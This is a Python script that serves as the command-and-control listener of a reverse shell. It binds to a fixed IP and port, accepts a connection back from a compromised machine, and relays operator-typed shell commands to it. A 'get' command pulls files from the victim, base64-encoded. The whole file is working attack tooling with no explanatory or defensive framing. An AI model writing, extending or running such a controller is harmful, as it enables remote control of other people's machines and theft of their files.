#! /usr/bin/python

import socket
import base64
import os

def server():
	global target
	global ip
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

	s.bind(("172.25.187.58", 54321))
	s.listen (1)

	print ("[+] Listening...")

	target, ip = s.accept()
	print ("[+] Connection Established: %s " %str(ip))


def rf(name):
	file = open(name, 'wb')
	while (True):
		try:
			m = target.recv(1024)
			m = m.decode('utf-8')
			if (m == "Donedone"):
				print ("[+]GOT")
				break
			file.write(base64.b64decode(m))
		except:
			continue

def receive():
	data = ""
	while (True):
		try:
			result = target.recv(1024).decode('utf-8')
			if (result == "Sentall"):
				return data
			data = data + result
		except:
			continue

def shell():
	global ip
	while(True):
		command = input("* Shell#-%s: " %str(ip))
		if command:
			target.send(command.encode('utf-8'))
		if (command == "end"):
			break
		elif (command == "clear"):
			os.system("clear")
		elif (command[:3] == "get"):
			rf(command[4:])
		elif (command[:2] == "cd" and len(command) > 1):
			continue
		else:
			print (receive())

server()
shell()
target.close
